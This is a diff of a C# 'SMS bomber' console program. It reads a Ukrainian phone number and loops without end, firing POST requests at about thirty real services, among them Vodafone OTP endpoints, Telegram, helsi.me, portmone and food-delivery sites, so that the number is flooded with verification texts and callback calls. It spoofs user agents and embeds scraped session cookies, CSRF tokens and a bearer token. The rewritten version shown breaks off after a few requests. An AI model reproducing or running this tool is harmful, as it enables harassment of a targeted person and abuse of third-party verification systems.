@@ -1,308 +1,303 @@
-﻿using System;
-using System.Text;
-using System.Net.Http;
+﻿
 using System.Net.Http.Headers;
-using System.Collections.Generic;
-using System.Threading.Tasks;
 using System.Text.RegularExpressions;
+using System.Text;
 
-namespace SMS_Bomber
+internal class Program
 {
-    internal class Program
+    static async Task Main()
     {
-        static async Task Main()
+        Console.Title = "SMS UA";
+        Console.OutputEncoding = Encoding.UTF8;
+
+        Console.Write("Enter your phone number in 380********* format: ");
+
+        string phone = Console.ReadLine();
+
+        if (!Regex.IsMatch(phone, @"^380\d{9}$"))
         {
-            Console.Title = "SMS UA";
-            Console.OutputEncoding = Encoding.UTF8;
+            Console.Write("Phone number is incorrect");
+            Console.ReadKey();
 
-            Console.Write("Enter your phone number in 380********* format: ");
-
-            string phone = Console.ReadLine();
-
-            if (!Regex.IsMatch(phone, @"^380\d{9}$"))
-            {
-                Console.Write("Phone number is incorrect");
-                Console.ReadKey();
-
-                return;
-            }
-
-            for (; ; )
-            {
-                if (Console.KeyAvailable)
-                    break;
-
-                Task[] requests = new Task[]
-                {
-				    SendRequestAsync("https://pizzaday.eatery.club/site/v1/pre-login", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://www.pizzaday.com.ua/" }
-				    }),
-
-				    SendRequestAsync("https://motozilla.com.ua/signup/", HttpMethod.Post, $"data[lastname]=ads&data[firstname]=asd&data[phone]={phone}&data[email]=asdads@gmail.com&wa_json_mode=1&need_redirects=1&contact_type=person", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://motozilla.com.ua/signup/" },
-					    { "Upgrade-Insecure-Requests", "1" }
-				    }),
-
-				    SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/login", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://helsi.me/" },
-				    }),
-
-				    SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/send", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://helsi.me/" },
-				    }),
-
-				    SendRequestAsync("https://auth2.multiplex.ua/login", HttpMethod.Post, $"{{\"login\":\"{phone}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://friends.multiplex.ua/" },
-					    { "X-Mx-Source", "WEB-FRIENDS" },
-				    }),
-
-				    SendRequestAsync("https://comfy.ua/api/auth/password/dynamic", HttpMethod.Post, "login[username]=" + $"+{phone.Substring(0, 2)}({phone.Substring(2, 3)})-{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://comfy.ua/ua/" },
-				    }),
-
-				    SendRequestAsync("https://smaki-maki.com/wp-admin/admin-ajax.php", HttpMethod.Post, "name=Никита+Чайник&phone=" + $"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}" + "&birthday=23.01.1999&password=BHs4YPuCExRppym&password2=BHs4YPuCExRppym&code=&action=register_user&nonce_code=9b2bc24717", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://smaki-maki.com/" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    }),
-
-				    SendRequestAsync("https://registration.vodafone.ua/api/v1/process/smsCode", HttpMethod.Post, $"{{\"number\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://registration.vodafone.ua/" },
-				    }),
-
-				    SendRequestAsync("https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute", HttpMethod.Post, $"{{\"params\":{{\"version\":\"2.1.8\",\"language\":\"ua\",\"source\":\"WebApp\",\"token\": null ,\"manufacture\":\"\",\"childNumber\":\"\",\"accessType\":\"\",\"spinner\": 1 }},\"requests\":{{\"loginV2\":{{\"id\":\"{phone.Substring(3)}\"}}}}}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://my.vodafone.ua/" },
-				    }),
-
-				    SendRequestAsync("https://mw-api.vodafone.ua/otp/api/one-time-password/secured", HttpMethod.Post, $"{{\"receiver\":\"{phone}\",\"receiverTypeKey\":\"PHONE-NUMBER\",\"typeKey\":\"MYVF-LOGIN-IOS\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://my.vodafone.ua/" },
-					    { "Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6WyJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6T1JERVItR0lGVCIsInRtZl9tc19jb21tdW5pY2F0aW9uX25vdGlmaWNhdGlvbl90eXBlOk5ld1NhbGVCaWxsIiwidG1mX21zX2N1c3RvbWVyX3Byb2ZpbGU6U0VMRi1DQVJFLUVNQUlMIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF9yZWFkIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAgY2hhbm5lbDpNWVZPREFGT05FLUFQUCIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpTRFAtQ1JFQVRFLVNVQlNDUklQVElPTiIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV9yZWFkIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkNIQU5HRS1TRVJWSUNFIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlRBUklGRi1QTEFOLUNIQU5HRSIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpERFMtREVBQ1RJVkFUSU9OIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkREUy1TWU5DLUFDVElWQVRJT04iLCJpdHNmX21zX2Fzc2V0X2NhdGVnb3J5Om15dmYtYXBwIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAiLCJ0bWZfbXNfY29tbXVuaWNhdGlvbl9ub3RpZmljYXRpb25fdHlwZTpCYWxhbmNlSGlzdG9yeURldGFpbHMiLCJ0bWZfbXNfaW50ZXJhY3Rpb25fcHJvZmlsZTpSVE0gb3BlbmVkIiwiaXRzZl9tc19hc3NldF9jYXRlZ29yeTpteXZmYjJiLXJlcG9ydHMiLCJ0bWZfbXNfZXZlbnRtYWtlcl9wcm9maWxlX2V2ZW50X3R5cGVfc3RhdGVfcmVhZCIsIm9wZW5pZCIsInRtZl9tc19pbnRlcmFjdGlvbl9wcm9maWxlOkRVQSIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV93cml0ZSIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpTSU0tQ0hBTkdFIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlNJTS1DSEFOR0UtQjJCIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkREUy1TWU5DLURFQUNUSVZBVElPTiIsIml0c2ZfbXNfYXNzZXRfY2F0ZWdvcnk6bXl2Zi1hcHAtYXZhdGFyIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlNEUC1ERUxFVEUtU1VCU0NSSVBUSU9OIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF90eXBlX3N0YXRlX3dyaXRlIiwiY2hhbm5lbDpNWVZPREFGT05FLVdFQiIsInRtZl9tc19xdWFsaWZpY2F0aW9uX3Byb2ZpbGU6UlRNOk1ZVk9EQUZPTkUtQVBQIiwidG1mX21zX2ludGVyYWN0aW9uX3Byb2ZpbGU6TVlWRi1TVEFUSVNUSUNTIl0sImV4cCI6MTcwMjk5ODkwNywiYWRkaXRpb25hbERldGFpbHMiOnsiUHJvZmlsZSI6Ik1ZVk9EQUZPTkUifSwiYXV0aG9yaXRpZXMiOlsiUk9MRV9BTk9OWU1PVVMiXSwianRpIjoiOWUxODhjOTItYzc3Yi00NGM2LWFkZTYtMDQzZmQzNmJiYjEyIiwidGVuYW50IjoiWE0iLCJjbGllbnRfaWQiOiJ3ZWItbXl2b2RhZm9uZS1tdyJ9.O0Fn-8DU3eKdUwUpx6ayPmwRQ0X77qAlA6uGikqgC6CYBv95t32FncmMMH62on-57c7KpwDZdkPoYdyq-dvfkPN2au4bnWg4E7-eZ7p2fTdhrCatkcRZqbfNelj2FaHl1qrC4xHPWZtWUWdLWPTNnyULxZstMpPnzltpHTgQOOj2WyHqcWeOBeZbIuOPoN0JN7eAIXzYk1-TH7cxho2Eb6YI8FGoEfi5-fJhXV-F4rMtR1IgnKNvBp-r47n8uY3UQSTaaEWO0-ap7CrI0KeJfo1pjSkYI6HZGUPmiA0EMs4EDH9ZGdC7uCWfqacu-rz9jbkYtgfKRmbNOAclGZP89A" },
-				    }),
-
-				    SendRequestAsync("https://frutalina.com.ua/callmeback/", HttpMethod.Post, $"url=https://frutalina.com.ua/callmeback/&user=Никита&phone={phone}&time_to_call=", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://frutalina.com.ua/callmeback/" },
-					    { "Upgrade-Insecure-Requests", "1" }
-				    }),
-
-				    SendRequestAsync("https://deliveryflower.com.ua/pravku/call.php", HttpMethod.Post, $"telfon={phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://deliveryflower.com.ua/" },
-					    { "X-Requested-With", "XMLHttpRequest" }
-				    }),
-
-				    SendRequestAsync("https://api.portmone.com.ua/auth/v2/registration", HttpMethod.Post, $"{{\"client_id\": \"62608e08adc29a8d6dbc9754e659f125\",\"scope\": \"https://api.portmone.com.ua/auth/client\",\"username\": \"{phone}\",\"password\": \"sdfdfsdfs2323few\",\"email\": \"adsadsasd2211@gmail.com\",\"verificationType\": \"phone_call\",\"attribute1\": \"\\u0420\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0430\\u0446\\u0438\\u044f \\u043d\\u0430 \\u0441\\u0430\\u0439\\u0442\\u0435 www.portmone.com https://www.portmone.com.ua/auth#signup\",\"verification_required\": true}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://www.portmone.com.ua/" },
-					    { "X-App-Uid", "a4242cb9e57b84ff73ed5061b296ece6" },
-				    }),
-
-				    SendRequestAsync("https://bi.ua/api/v1/accounts", HttpMethod.Post, "{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"амогус\",\"phone\":\"" + phone + "\"}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://bi.ua/ukr/signup/" },
-					    { "Language", "uk" },
-					    { "Authorization", "Bearer null" },
-					    { "Cookie", "advanced-frontend=hdpepdrvghor7912u25i77bv6u; _csrf-frontend=bc0a155f4a22546aea0485eb780398e6b932acb89cb6f70e333b467ee8c4cdc1a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22QZ3UXDo7flFSnsEPvb6cmPJUk5oGBk7L%22%3B%7D" }
-				    }),
-
-				    SendRequestAsync("https://farsh.in.ua/wp-admin/admin-ajax.php", HttpMethod.Post, $"action=user_login&formData=tel=+{phone.Substring(0, 2)}({phone.Substring(2, 3)}){phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&code=", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://farsh.in.ua/" },
-					    { "X-Requested-With", "XMLHttpRequest" }
-				    }),
-
-				    SendRequestAsync("https://gogo-pizza.eatery.club/site/v1/pre-login", HttpMethod.Post, $"{{\"phone\":\"{phone}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-				    }),
-
-				    SendRequestAsync("https://instafood.com.ua/ajax/callback-form", HttpMethod.Post, $"forms=forms-callback-application&modal=1&name=Никита+Борисенко&phone=+{phone.Substring(0, 2)}({phone.Substring(2, 3)}){phone.Substring(5, 3)}{phone.Substring(8)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "X-Csrf-Token", "2CzMPSK85UUrBuONVKbHGiqD0OI1h8XxCb3OJotD" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    }),
-
-				    SendRequestAsync("https://sms-fly.ua/registration/confirm/", HttpMethod.Post, $"step=1&user_name={phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://sms-fly.ua/ru/registration/" },
-					    { "Upgrade-Insecure-Requests", "1" },
-				    }),
-
-				    SendRequestAsync("https://my.smsclub.mobi/auth?reg=1", HttpMethod.Post, $"_csrf=X-gTrBUDbTNKPFm5Y7-JMO8kwRA0nidXTH7buzEfhgduhWPIfC40f3hlAeAoi9N2h3GxImXtExM_O7TceSznUw==&RegisterForm[name]=1&RegisterForm[business]=1&RegisterForm[typeTrafik]=Чат-бот&RegisterForm[phone]=+{phone}&RegisterForm[email]=penisula233@gmail.com&RegisterForm[regRules]=0&RegisterForm[regRules]=1&cf-turnstile-response=0.hx2pbAy6W7MTAnjyN75p1JgcPaiZVwzRuTWaNEUGRuIj1plCeX_FZ7R9C2iqpD4-9muWh5Gh8GRcfkcFk5lai1V4bKM6yxIBJw0Zdxpomp7s3-eKLiJi3uFmvKCESXKS8z1xnmeAEy5CVWuR2bvUu86FrxRastFwDaMQbWbTeJvgWFA6yWPdhwVmGkWYvXJodx45X4XgcLmedDADbdtA4GLCYqa5Vy6mLrvgG55CL9HmEAD9L2DloIcTQzigcmlvH9CeFH1WkIoiSVEG6UnAo3XF76sd8KcHLLAc1XOgm4ALoq1DARoctZvPTo7C6k6lVzfLqbCKALdlDzd3ZgUk2jt2OZG6WPsh5rH464Q8N5It5e4-tZUn8ReBn6s1mUO0YVvdxa_vjzrDC-h_Twrn6Y18rjfiQfWksCGcdn7LBMls1D0mUGHE1m486DauD6KG.mf0c-NpLb6xRL39pqNZwGQ.d8dd43e4c8c48292121c65bde2fcfcd1289fbf3c39453bdb8bb1abcd456141c0&reg-button=", "text/html", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Cookie", "_session_sclub_smsclub_mobi=f499e9aa7d1dbf9e544aadf3f65132ea; _csrf=1mpdi-YL2YXYK4ZFhUp2Qs4DsEogH3aT; evercookie=id_visit=6d792e736d73636c75622e6d6f6269_4125518; id_visit=6d792e736d73636c75622e6d6f6269_4125518" },
-					    { "Referer", "https://my.smsclub.mobi/auth?reg=1" },
-					    { "Upgrade-Insecure-Requests", "1" },
-				    }),
-
-				    SendRequestAsync("https://auth.easypay.ua/api/check", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://easypay.ua/" },
-					    { "appid", "e63b0537-bf15-453f-8a02-d49f85261e61" },
-					    { "pageid", "663b83ef-bfe9-47d9-809b-98784d37a12c" },
-					    { "partnerkey", "easypay-v2" },
-				    }),
-
-				    SendRequestAsync("https://my.telegram.org/auth/send_password", HttpMethod.Post, $"phone=+{phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "X-Requested-With", "XMLHttpRequest" }
-				    }),
-
-				    SendRequestAsync("https://origami.phonet.com.ua/rest/public/widget/call-catchers/d494caf7-b9df-43ea-9148-e4871ba6cfe8/call?timestamp=1702982637220&utcOffset=-120", HttpMethod.Post, $"{{\"phone\":\"+{phone}\",\"utm\":{{\"source\":\"google\",\"medium\":\"organic\",\"campaign\":\"(not set)\",\"content\":\"(not set)\",\"term\":\"(not set)\"}},\"referrer\":\"https://www.google.com/\",\"telerSessionId\":\"9ac360f4-d4ce-49df-89aa-4287d7b4f904\",\"pageUrl\":\"https://panda-pizza.com.ua/\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://panda-pizza.com.ua/" }
-				    }),
-
-				    SendRequestAsync("https://origami.phonet.com.ua/rest/public/widget/call-catchers/24882f40-7a0d-4b8b-8bc0-b290c725c281/call?timestamp=1702985890430&utcOffset=-120", HttpMethod.Post, $"{{\"phone\":\"+{phone}\",\"utm\":{{\"source\":\"google\",\"medium\":\"organic\",\"campaign\":\"(not set)\",\"content\":\"(not set)\",\"term\":\"(not set)\"}},\"referrer\":\"https://www.google.com/\",\"telerSessionId\":\"05528ef7-8a36-4294-a549-96630df9e463\",\"pageUrl\":\"https://panda-sushi.com.ua/\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://panda-sushi.com.ua/" }
-				    }),
-
-				    SendRequestAsync("https://karuzo.ua/index.php?route=callback/callback/send", HttpMethod.Post, $"phone={phone.Substring(3)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "X-Requested-With", "XMLHttpRequest" }
-				    }),
-
-				    SendRequestAsync("https://966.ua/esputnik/getUserByPhone", HttpMethod.Post, $"{{\"phone\":\"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}\"}}", "text/plain", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Referer", "https://966.ua/" },
-					    { "Cookie", "PHPSESSID=lkdaru98atm9tfgourbrkkl7h6; cityName=1; cityExtension=0000010539; BITRIX_SM_GUEST_ID=6719563; BITRIX_SM_SALE_UID=e848c4582d7d8288807954252036dc4b; cf_clearance=xDqpEKg3fWK94G8LweVDAwUip1xvIaKgTuHA4SoYGyE-1702986320-0-1-ee265f4.a1d01b6b.1bb732c6-0.2.1702986320; sc=B7E87D94-6AD1-7BCD-5FA3-6C20C6B724A9; googtrans=/ru/uk; googtrans=/ru/uk; BITRIX_SM_LAST_VISIT=19.12.2023+13%3A45%3A51" },
-				    }),
-
-				    SendRequestAsync("https://www.sushiya.ua/api/v1/user/auth", HttpMethod.Post, $"phone={phone.Substring(2)}&need_skeep=", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://www.sushiya.ua" },
-					    { "Referer", "https://www.sushiya.ua/" },
-					    { "Authorization", "Bearer demo" },
-					    { "Cookie", "5c56ddacb7d52afbab2130776ac59994=ed0j6pmrt2r60h9i5ij01v5df5; dae23e1f6b5bf8609e2224d695520311=uk-UA; popup_sushiya=61d015a3d466d1119c01095c4960ab10" },
-				    }),
-
-				    SendRequestAsync("https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/", HttpMethod.Post, $"form_action=https://yaposhka.com.ua/ua/brander_smsconfirm_customer/process/init/&telephone=+{phone.Substring(0, 3)}({phone.Substring(3, 3)}){phone.Substring(6, 3)}-{phone.Substring(9, 2)}-{phone.Substring(11)}", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://yaposhka.com.ua" },
-					    { "Referer", "https://yaposhka.com.ua/ua/" },
-					    { "Cookie", "PHPSESSID=i52oi798q2os1o4d9p6c9sa3cr; store_code=ua; private_content_version=updated-658189b4eb07f8.40387657; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-12-19%2014%3A17%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2023-12-19%2014%3A17%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36%20Edg%2F120.0.0.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fyaposhka.com.ua%2Fua%2F; form_key=zFRcq1vHcUNKjicO; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=zFRcq1vHcUNKjicO; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; section_data_ids={%22google_ecommerce_data%22:1702988222%2C%22advanced-map-location%22:1702988226}" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    }),
-
-				    SendRequestAsync("https://yoki.ua/lviv/wp-admin/admin-ajax.php", HttpMethod.Post, $"first_name=1&email=asdasdasdda@gmail.com&phone=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}+{phone.Substring(8, 2)}+{phone.Substring(10, 2)}&input_check_send_sms=&password=Nk57qwygzRfCQaS&password2=Nk57qwygzRfCQaS&agree=on&action=register_user&nonce=72f71b07c6", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://yoki.ua" },
-					    { "Referer", "https://yoki.ua/lviv/ru/product-category/roly/" },
-					    { "Cookie", "qtrans_front_language=ru; PHPSESSID=h5l0n1c0vl1iohb9gmcekbpiee; woocommerce_cart_hash=977184732ce7525ea95ce265be1b6bc7; shop_not_working=is_active; current_blog_id=4; geolocation=OK; not_working_popup=; disabled-orders=; enabled_maintenance=1; terminal_text=; type_delivery=courier; terminal_id=55b590c1-7cce-26fe-0177-1fcba8d500ce" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    }),
-
-				    SendRequestAsync("https://yama.ua/api/ajax_forms/link/04553295_c194_47cf_9d42_d2cb05be53e4?destination=/menu&_wrapper_format=drupal_ajax&ajax_form=1&_wrapper_format=drupal_ajax", HttpMethod.Post, $"field_user_name[0][value]=&form_build_id=form-FXFlUfKkMMLqV83umAZO6jBf3wLlOYJEODGP6MV6guQ&form_id=user_register_form&antibot_key=kQN0tDNWy9ot6VW-v6aM8NPDkCpo1D0QmLIecY-GmzU&field_user_phone[0][value]=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&mail=&pass[pass1]=Cg:_yVRyLCGm5_3&pass[pass2]=Cg:_yVRyLCGm5_3&_triggering_element_name=op&_triggering_element_value=Надіслати+смс+код&_drupal_ajax=1&ajax_page_state[theme]=personal&ajax_page_state[theme_token]=&ajax_page_state[libraries]=ajax_forms/main,antibot/antibot.form,basket/basket.js,basket/jquery.inputmask,basket_other/js,classy/base,classy/messages,core/drupal.autocomplete,core/drupal.form,core/internal.jquery.form,core/normalize,customer_city/geolocation,drupal_noty_messages/drupal_noty_messages,eu_cookie_compliance/eu_cookie_compliance_default,load_more_and_pager/ajax_init,paragraphs/drupal.paragraphs.unpublished,personal/catalog_page,personal/default,search_block/search_block.styles,system/base,user/drupal.user,views/views.ajax,views/views.module,webform/libraries.jquery.select2,webform/webform.element.inputmask,xswitcher/js", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://yama.ua" },
-					    { "Referer", "https://yama.ua/menu" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    }),
-
-				    SendRequestAsync("https://pomidoros.com.ua/wp-content/themes/pomidoros/includes/register_login.php", HttpMethod.Post, $"register[]=1&register[]=&register[]=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}-{phone.Substring(8, 2)}-{phone.Substring(10, 2)}&register[]=penisula@gmail.com&register[]=bucha&register[]=asdadsadsad22", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://pomidoros.com.ua" },
-					    { "Referer", "https://pomidoros.com.ua/yslovia-dostavki/" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-					    { "Cookie", "SSESSb6c0fc2e25b5bd66612ebddc782c9fc0=ab24c881ff5abd29fb5db1c0171dc20c; static-cached=1; region=bucha" },
-				    }),
-
-				    SendRequestAsync("https://vilki-palki.od.ua/api/secret/generate?lang=ukrainian", HttpMethod.Post, $"{{\"phone\":\"+{phone.Substring(0, 2)} ({phone.Substring(2, 3)}) {phone.Substring(5, 3)} {phone.Substring(8, 2)} {phone.Substring(10, 2)}\"}}", "application/json", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://vilki-palki.od.ua" },
-					    { "Referer", "https://vilki-palki.od.ua/" },
-				    }),
-
-				    SendRequestAsync("https://prontopizza.ua/wp-admin/admin-ajax.php", HttpMethod.Post, $"first_name=1&last_name=2&birthday=01.01.2000&phone=+{phone.Substring(0, 2)}+({phone.Substring(2, 3)})+{phone.Substring(5, 3)}+{phone.Substring(8, 2)}+{phone.Substring(10, 2)}&input_check_send_sms=&email=asdasdqweqweq@gmail.com&password=sAabsQX3RYReyi&password2=sAabsQX3RYReyi&agree=on&action=register_user", "application/x-www-form-urlencoded", new Dictionary<string, string>
-				    {
-					    { "User-Agent", GenerateUserAgent() },
-					    { "Origin", "https://prontopizza.ua" },
-					    { "Referer", "https://prontopizza.ua/" },
-					    { "X-Requested-With", "XMLHttpRequest" },
-				    })
-                };
-
-                await Task.WhenAll(requests);
-
-                GC.Collect();
-            }
-
-            Console.WriteLine("Ended");
-            Console.ReadLine();
+            return;
         }
 
-        static async Task SendRequestAsync(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers)
+        for (; ; )
         {
-            using (HttpClient httpClient = new HttpClient())
+            if (Console.KeyAvailable)
+                break;
+
+            Task[] requests = new Task[]
             {
-                HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
-
-                httpRequest.Content = new StringContent(data);
-                httpRequest.Content.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
-
-                foreach (var header in headers)
+                SendRequestAsync("https://pizzaday.eatery.club/site/v1/pre-login", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
                 {
-                    httpRequest.Headers.Add(header.Key, header.Value);
-                }
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://www.pizzaday.com.ua/" }
+                }),
 
-                try
+                SendRequestAsync("https://motozilla.com.ua/signup/", HttpMethod.Post, $"data[lastname]=ads&data[firstname]=asd&data[phone]={phone}&data[email]=asdads@gmail.com&wa_json_mode=1&need_redirects=1&contact_type=person", "application/x-www-form-urlencoded", new Dictionary<string, string>
                 {
-                    HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
-                    string content = await httpResponse.Content.ReadAsStringAsync();
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://motozilla.com.ua/signup/" },
+                    { "Upgrade-Insecure-Requests", "1" }
+                }),
 
-                    Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] {httpRequest.RequestUri.Host}: {httpResponse.StatusCode}");
-                }
-                catch (Exception e)
+                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/login", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                 {
-                    Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")}] Error: {e.Message}");
-                }
-            }
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://helsi.me/" },
+                }),
+
+                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/send", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
+                {
+                    { "User-Agent", GenerateUserAgent() },
+                    { "Referer", "https://helsi.me/" },
+                }),
+
